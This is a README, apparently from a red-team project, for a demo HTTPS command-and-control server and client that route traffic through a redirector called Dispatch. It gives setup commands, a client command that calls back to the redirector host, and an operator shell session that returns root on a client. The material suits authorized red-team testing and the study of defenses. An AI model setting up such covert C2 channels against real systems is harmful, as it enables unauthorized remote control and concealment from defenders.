# Dispatch Redirector Demo

## Overview
The following code provides a sample C2 over HTTPS to demonstrate Dispatch's Reverse Proxy functionality. 

- Accepts connections multiple from clients
- Routes traffic through front-end proxies (e.g., NGINX, CDN)
- Maintains secure communication over HTTPS
- Provides an interactive operator shell for issuing commands


## 🛠️ Dispatch Setup
### 1. General SSL Cert & Start the Server
```bash
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem
python3 server.py --host <bind_host> --port <bind_port>
```

### 2. Setup Dispatch routes to redirect client traffic
<img height="400" alt="rProxy" src="https://github.com/user-attachments/assets/508adf2c-33f6-4088-a800-93d4a597c074" />


### 3. Start the client directing it at Dispatch redirector
```bash
 python3 client.py --url https://<dispatch_server>
```

### 4. Interact with connected clients
```bash
[!] New client registered: client-1 (192.168.1.100)
(server) > interact client-1
[*] Entering session with client-1. Type 'bg' to return.

(client-1) > whoami
[+] Response from client-1:
root
```
